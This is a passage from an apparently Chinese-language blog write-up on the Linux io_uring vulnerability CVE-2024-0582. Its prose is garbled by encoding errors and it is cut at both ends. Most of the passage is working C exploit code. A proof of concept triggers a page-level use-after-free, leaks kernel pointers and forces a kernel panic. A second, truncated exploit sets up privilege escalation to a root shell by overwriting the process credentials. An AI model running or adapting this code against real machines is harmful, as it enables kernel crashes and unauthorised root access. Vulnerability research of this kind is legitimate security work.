class="hljs-string">&quot;\033[34m\033[1m&quot;</span> msg <span class="hljs-string">&quot;\033[0m&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> ERR_MSG(msg) <span class="hljs-string">&quot;\033[31m\033[1m&quot;</span> msg <span class="hljs-string">&quot;\033[0m&quot;</span></span><br><br><span class="hljs-type">void</span> <span class="hljs-title function_">bind_core</span><span class="hljs-params">(<span class="hljs-type">int</span> core)</span><br>&#123;<br>    <span class="hljs-type">cpu_set_t</span> cpu_set;<br><br>    CPU_ZERO(&amp;cpu_set);<br>    CPU_SET(core, &amp;cpu_set);<br>    sched_setaffinity(getpid(), <span class="hljs-keyword">sizeof</span>(cpu_set), &amp;cpu_set);<br><br>    <span class="hljs-built_in">printf</span>(INFO_MSG(<span class="hljs-string">&quot;[*] Process binded to core: &quot;</span>) <span class="hljs-string">&quot;%d\n&quot;</span>, core);<br>&#125;<br><br><span class="hljs-keyword">struct</span> io_uring_buf_ring*<br><span class="hljs-title function_">setup_pbuf_ring_mmap</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> io_uring *ring, <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> ring_entries,</span><br><span class="hljs-params">                     <span class="hljs-type">int</span> bgid, <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> flags, <span class="hljs-type">int</span> *retp)</span><br>&#123;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">io_uring_buf_ring</span> *<span class="hljs-title">buf_ring</span>;</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">io_uring_buf_reg</span> <span class="hljs-title">buf_reg</span>;</span><br>    <span class="hljs-type">size_t</span> ring_size;<br>    <span class="hljs-type">off_t</span> offset;<br>    <span class="hljs-type">int</span> ret;<br><br>    <span class="hljs-built_in">memset</span>(&amp;buf_reg, <span class="hljs-number">0</span>, <span class="hljs-keyword">sizeof</span>(buf_reg));<br><br>    <span class="hljs-comment">/* we don&#x27;t need to set reg.addr for IOU_PBUF_RING_MMAP */</span><br>    buf_reg.ring_entries = ring_entries;<br>    buf_reg.bgid = bgid;<br>    buf_reg.flags = IOU_PBUF_RING_MMAP;<br><br>    ret = io_uring_register_buf_ring(ring, &amp;buf_reg, flags);<br>    <span class="hljs-keyword">if</span> (ret) &#123;<br>        <span class="hljs-built_in">puts</span>(ERR_MSG(<span class="hljs-string">&quot;[x] Error occur while doing io_uring_register_buf_ring&quot;</span>));<br>        *retp = ret;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">NULL</span>;<br>    &#125;<br><br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment"> [chr(int(i,16))for i in[&#x27;3361626e74747261&#x27;[i:i+2]for i in range(0,16,2)]][::-1]</span><br><span class="hljs-comment">    **/</span><br>    offset = IORING_OFF_PBUF_RING | (<span class="hljs-type">uint64_t</span>) bgid &lt;&lt; IORING_OFF_PBUF_SHIFT;<br>    ring_size = ring_entries * <span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">struct</span> io_uring_buf);<br>    buf_ring = mmap(<br>        <span class="hljs-literal">NULL</span>,<br>        ring_size,<br>        PROT_READ | PROT_WRITE, MAP_SHARED | MAP_POPULATE,<br>        ring-&gt;ring_fd,<br>        offset<br>    );<br><br>    <span class="hljs-keyword">if</span> (IS_ERR(buf_ring)) &#123;<br>        <span class="hljs-built_in">puts</span>(ERR_MSG(<span class="hljs-string">&quot;[x] Error occur while doing mmap() for io_uring&quot;</span>));<br>        *retp = PTR_ERR(buf_ring);<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">NULL</span>;<br>    &#125;<br><br>    *retp = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">return</span> buf_ring;<br>&#125;<br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> NR_PAGES    1</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> NR_BUFFERS  0x100</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> SEQ_FILE_NR 0x200</span><br><br><span class="hljs-type">void</span> <span class="hljs-title function_">proof_of_concept</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">io_uring</span> <span class="hljs-title">ring</span>;</span><br>    <span class="hljs-type">void</span> **buffers;<br>    <span class="hljs-type">int</span> seq_fd[SEQ_FILE_NR], found = <span class="hljs-number">0</span>;<br>    <span class="hljs-type">int</span> ret;<br><br>    <span class="hljs-built_in">puts</span>(SUCCESSS_MSG(<span class="hljs-string">&quot;-------- CVE-2024-0582 Proof-of-concet --------&quot;</span>));<br>    <span class="hljs-built_in">puts</span>(INFO_MSG(<span class="hljs-string">&quot;-------\t\t Author: &quot;</span>) <span class="hljs-string">&quot;arttnba3&quot;</span> INFO_MSG(<span class="hljs-string">&quot; \t-------&quot;</span>));<br>    <span class="hljs-built_in">puts</span>(SUCCESSS_MSG(<span class="hljs-string">&quot;-----------------------------------------------\n&quot;</span>));<br><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] Preparing...&quot;</span>);<br><br>    bind_core(<span class="hljs-number">0</span>);<br><br>    <span class="hljs-keyword">if</span> (io_uring_queue_init(<span class="hljs-number">4</span>, &amp;ring, <span class="hljs-number">0</span>) &lt; <span class="hljs-number">0</span>) &#123;<br>        perror(ERR_MSG(<span class="hljs-string">&quot;[x] Unable to init for io_uring queue&quot;</span>));<br>        <span class="hljs-built_in">exit</span>(EXIT_FAILURE);<br>    &#125;<br><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] Allocating pbuf ring and doing mmap()...&quot;</span>);<br><br>    buffers = <span class="hljs-built_in">calloc</span>(NR_BUFFERS, <span class="hljs-keyword">sizeof</span>(<span class="hljs-type">void</span>*));<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; NR_BUFFERS; i++) &#123;<br>        buffers[i] = setup_pbuf_ring_mmap(<br>            &amp;ring,<br>            NR_PAGES * PAGE_SIZE / <span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">struct</span> io_uring_buf),<br>            i,<br>            <span class="hljs-number">0</span>,<br>            &amp;ret<br>        );<br>        <span class="hljs-keyword">if</span> (ret) &#123;<br>            <span class="hljs-built_in">printf</span>(<br>                ERR_MSG(<span class="hljs-string">&quot;[x] Unable to set up&quot;</span>) <span class="hljs-string">&quot; No.%d &quot;</span><br>                ERR_MSG(<span class="hljs-string">&quot;pbuf ring, error code: &quot;</span>) <span class="hljs-string">&quot;%d\n&quot;</span>,<br>                i,<br>                ret<br>            );<br>            <span class="hljs-built_in">exit</span>(EXIT_FAILURE);<br>        &#125;<br><br>        io_uring_buf_ring_init(buffers[i]);<br>    &#125;<br><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] Triggering page-level UAF vulnerabilities...&quot;</span>);<br><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; NR_BUFFERS; i++) &#123;<br>        ret = io_uring_unregister_buf_ring(&amp;ring, i);<br>        <span class="hljs-keyword">if</span> (ret) &#123;<br>            <span class="hljs-built_in">printf</span>(<br>                ERR_MSG(<span class="hljs-string">&quot;[x] Unable to unregister&quot;</span>) <span class="hljs-string">&quot; No.%d &quot;</span><br>                ERR_MSG(<span class="hljs-string">&quot;pbuf ring, error code: &quot;</span>) <span class="hljs-string">&quot;%d\n&quot;</span>,<br>                i,<br>                ret<br>            );<br>            <span class="hljs-built_in">exit</span>(EXIT_FAILURE);<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] Reallocating page into seq_file::seq_operations...&quot;</span>);<br><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; SEQ_FILE_NR; i++) &#123;<br>        <span class="hljs-keyword">if</span> ((seq_fd[i] = open(<span class="hljs-string">&quot;/proc/self/stat&quot;</span>, O_RDONLY)) &lt; <span class="hljs-number">0</span>) &#123;<br>            <span class="hljs-built_in">printf</span>(<br>                ERR_MSG(<span class="hljs-string">&quot;[x] Unable to open&quot;</span>) <span class="hljs-string">&quot; No.%d &quot;</span><br>                ERR_MSG(<span class="hljs-string">&quot;seq file, error code: &quot;</span>) <span class="hljs-string">&quot;%d\n&quot;</span>,<br>                i,<br>                seq_fd[i]<br>            );<br>            <span class="hljs-built_in">exit</span>(EXIT_FAILURE);<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] Checking data leak and overwriting...&quot;</span>);<br><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; NR_BUFFERS; i++) &#123;<br>        <span class="hljs-type">uint64_t</span> *buffer = buffers[i];<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> j = <span class="hljs-number">0</span>; j &lt; (NR_PAGES * PAGE_SIZE / <span class="hljs-keyword">sizeof</span>(<span class="hljs-type">uint64_t</span>)); j++) &#123;<br>            <span class="hljs-keyword">if</span> (buffer[j]&gt;<span class="hljs-number">0xffffffff80000000</span> &amp;&amp; buffer[j]&lt;<span class="hljs-number">0xfffffffff0000000</span>) &#123;<br>                <span class="hljs-built_in">printf</span>(<br>                    SUCCESSS_MSG(<span class="hljs-string">&quot;[+] Got kernel data leak:&quot;</span>) <span class="hljs-string">&quot; %lx &quot;</span><br>                    SUCCESSS_MSG(<span class="hljs-string">&quot;at location &quot;</span>) <span class="hljs-string">&quot;%d-%d\n&quot;</span>,<br>                    buffer[j],<br>                    i,<br>                    j<br>                );<br>                buffer[j] = *(<span class="hljs-type">uint64_t</span>*) <span class="hljs-string">&quot;arttnba3&quot;</span>;<br>                found = <span class="hljs-number">1</span>;<br>                <span class="hljs-keyword">goto</span> out;<br>            &#125;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">if</span> (!found) &#123;<br>        <span class="hljs-built_in">puts</span>(ERR_MSG(<span class="hljs-string">&quot;[x] Failed to reallocate UAF page as seq_operations!&quot;</span>));<br>        <span class="hljs-built_in">exit</span>(EXIT_FAILURE);<br>    &#125;<br><br>out:<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] Triggering kernel panic...&quot;</span>);<br><br>    sleep(<span class="hljs-number">1</span>);<br><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; SEQ_FILE_NR; i++) &#123;<br>        <span class="hljs-type">char</span> buf[<span class="hljs-number">0x1000</span>];<br>        read(seq_fd[i], buf, <span class="hljs-number">1</span>);<br>    &#125;<br><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[?] So you&#x27;re still alive here!?&quot;</span>);<br>    system(<span class="hljs-string">&quot;/bin/sh&quot;</span>);<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">char</span> **argv, <span class="hljs-type">char</span> **envp)</span><br>&#123;<br>    proof_of_concept();<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>è¿è¡Œï¼ŒæˆåŠŸé€ æˆ kernel panicï¼š</p><p><img src="https://s2.loli.net/2025/03/13/1z9IqkSWFUQst5r.png"></p><h1 id="0x02-æ¼æ´åˆ©ç”¨"><a href="#0x02-æ¼æ´åˆ©ç”¨" class="headerlink" title="0x02. æ¼æ´åˆ©ç”¨"></a>0x02. æ¼æ´åˆ©ç”¨</h1><p>è¿™ä¸ª UAF å¯è°“æ˜¯ç›¸å½“çš„ç™½ç»™ï¼Œå…¶æ¥è‡ªäºéå¸¸å¸¸è§çš„åˆ†é… page çš„ APIï¼Œå¹¶ä¸”å¯ä»¥åœ¨ç”¨æˆ·ç©ºé—´ç›´æ¥è¯»å†™ UAF pageï¼Œæ‰€ä»¥åˆ©ç”¨æ–¹å¼åŸºæœ¬ä¸Šå¯ä»¥è¯´æ˜¯å¤šç§å¤šæ ·çš„ï¼Œ <strong>å¯è°“æ˜¯æƒ³æ€ä¹ˆåˆ©ç”¨å°±æ€ä¹ˆåˆ©ç”¨ï¼Œè€Œä¸”è¿˜ç‰¹åˆ«ç¨³å®š</strong> </p><p>è¿™é‡Œç¬”è€…ç›´æ¥ç”¨ page-level UAF é€šè¿‡æ”¹å†™ <code>pipe_buffer::page</code> çš„æ–¹å¼è·å–å†…æ ¸ç©ºé—´ä»»æ„è¯»å†™çš„æƒèƒ½ï¼Œä¹‹åç›´æ¥æ”¹å†™å½“å‰è¿›ç¨‹çš„ <code>cred</code> ç»“æ„ä½“å®Œæˆææƒï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span class="line">390</span><br><span class="line">391</span><br><span class="line">392</span><br><span class="line">393</span><br><span class="line">394</span><br><span class="line">395</span><br><span class="line">396</span><br><span class="line">397</span><br><span class="line">398</span><br><span class="line">399</span><br><span class="line">400</span><br><span class="line">401</span><br><span class="line">402</span><br><span class="line">403</span><br><span class="line">404</span><br><span class="line">405</span><br><span class="line">406</span><br><span class="line">407</span><br><span class="line">408</span><br><span class="line">409</span><br><span class="line">410</span><br><span class="line">411</span><br><span class="line">412</span><br><span class="line">413</span><br><span class="line">414</span><br><span class="line">415</span><br><span class="line">416</span><br><span class="line">417</span><br><span class="line">418</span><br><span class="line">419</span><br><span class="line">420</span><br><span class="line">421</span><br><span class="line">422</span><br><span class="line">423</span><br><span class="line">424</span><br><span class="line">425</span><br><span class="line">426</span><br><span class="line">427</span><br><span class="line">428</span><br><span class="line">429</span><br><span class="line">430</span><br><span class="line">431</span><br><span class="line">432</span><br><span class="line">433</span><br><span class="line">434</span><br><span class="line">435</span><br><span class="line">436</span><br><span class="line">437</span><br><span class="line">438</span><br><span class="line">439</span><br><span class="line">440</span><br><span class="line">441</span><br><span class="line">442</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * Copyright (c) 2025 arttnba3 &lt;arttnba@gmail.com&gt;</span><br><span class="hljs-comment"> * </span><br><span class="hljs-comment"> * This work is licensed under the terms of the GNU GPL, version 2 or later.</span><br><span class="hljs-comment">**/</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> _GNU_SOURCE</span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdint.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdarg.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;fcntl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sched.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;liburing.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/mman.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/user.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/prctl.h&gt;</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">ifndef</span> IS_ERR</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> IS_ERR(ptr) ((uintptr_t) ptr &gt;= (uintptr_t) -4095UL)</span><br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">ifndef</span> PTR_ERR</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> PTR_ERR(ptr) ((int) (intptr_t) ptr)</span><br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> SUCCESS_MSG(msg) <span class="hljs-string">&quot;\033[32m\033[1m&quot;</span> msg <span class="hljs-string">&quot;\033[0m&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> INFO_MSG(msg) <span class="hljs-string">&quot;\033[34m\033[1m&quot;</span> msg <span class="hljs-string">&quot;\033[0m&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> ERR_MSG(msg) <span class="hljs-string">&quot;\033[31m\033[1m&quot;</span> msg <span class="hljs-string">&quot;\033[0m&quot;</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> KASLR_GRANULARITY 0x10000000</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> KASLR_MASK (~(KASLR_GRANULARITY - 1))</span><br><span class="hljs-type">uint64_t</span> kernel_base, vmemmap_base, page_offset_base;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">bind_core</span><span class="hljs-params">(<span class="hljs-type">int</span> core)</span><br>&#123;<br>    <span class="hljs-type">cpu_set_t</span> cpu_set;<br><br>    CPU_ZERO(&amp;cpu_set);<br>    CPU_SET(core, &amp;cpu_set);<br>    sched_setaffinity(getpid(), <span class="hljs-keyword">sizeof</span>(cpu_set), &amp;cpu_set);<br><br>    <span class="hljs-built_in">printf</span>(INFO_MSG(<span class="hljs-string">&quot;[*] Process binded to core: &quot;</span>) <span class="hljs-string">&quot;%d\n&quot;</span>, core);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">err_exit</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-type">char</span> *fmt, ...)</span><br>&#123;<br>    va_list args;<br>    <span class="hljs-type">int</span> ret;<br><br>    va_start(args, fmt);<br>    <span class="hljs-built_in">printf</span>(fmt, args);<br>    va_end(args);<br><br>    fflush(<span class="hljs-built_in">stdout</span>);<br>    fflush(<span class="hljs-built_in">stderr</span>);<br><br>    sleep(<span class="hljs-number">5</span>);<br><br>    <span class="hljs-built_in">exit</span>(EXIT_FAILURE);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">get_root_shell</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>    <span class="hljs-keyword">if</span>(getuid()) &#123;<br>        <span class="hljs-built_in">puts</span>(ERR_MSG(<span class="hljs-string">&quot;[x] Failed to get the root!&quot;</span>));<br>        sleep(<span class="hljs-number">5</span>);<br>        <span class="hljs-built_in">exit</span>(EXIT_FAILURE);<br>    &#125;<br><br>    <span class="hljs-built_in">puts</span>(SUCCESS_MSG(<span class="hljs-string">&quot;[+] Successful to get the root.&quot;</span>));<br>    <span class="hljs-built_in">puts</span>(INFO_MSG(<span class="hljs-string">&quot;[*] Execve root shell now...&quot;</span>));<br><br>    system(<span class="hljs-string">&quot;/bin/sh&quot;</span>);<br>    <br>    <span class="hljs-comment">/* to exit the process normally, instead of potential segmentation fault */</span><br>    <span class="hljs-built_in">exit</span>(EXIT_SUCCESS);<br>&#125;<br><br><span class="hljs-keyword">struct</span> io_uring_buf_ring*<br><span class="hljs-title function_">setup_pbuf_ring_mmap</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> io_uring *ring, <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> ring_entries,</span><br><span class="hljs-params">                     <span class="hljs-type">int</span> bgid, <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> flags, <span class="hljs-type">int</span> *retp)</span><br>&#123;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">io_uring_buf_ring</span> *<span class="hljs-title">buf_ring</span>;</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">io_uring_buf_reg</span> <span class="hljs-title">buf_reg</span>;</span><br>    <span class="hljs-type">size_t</span> ring_size;<br>    <span class="hljs-type">off_t</span> offset;<br>    <span class="hljs-type">int</span> ret;<br><br>    <span class="hljs-built_in">memset</span>(&amp;buf_reg, <span class="hljs-number">0</span>, <span class="hljs-keyword">sizeof</span>(buf_reg));<br><br>    <span class="hljs-comment">/* we don&#x27;t need to set reg.addr for IOU_PBUF_RING_MMAP */</span><br>    buf_reg.ring_entries = ring_entries;<br>    buf_reg.bgid = bgid;<br>    buf_reg.flags = IOU_PBUF_RING_MMAP;<br><br>    ret = io_uring_register_buf_ring(ring, &amp;buf_reg, flags);<br>    <span class="hljs-keyword">if</span> (ret) &#123;<br>        <span class="hljs-built_in">puts</span>(ERR_MSG(<span class="hljs-string">&quot;[x] Error occur while doing io_uring_register_buf_ring&quot;</span>));<br>        *retp = ret;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">NULL</span>;<br>    &#125;<br><br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment"> 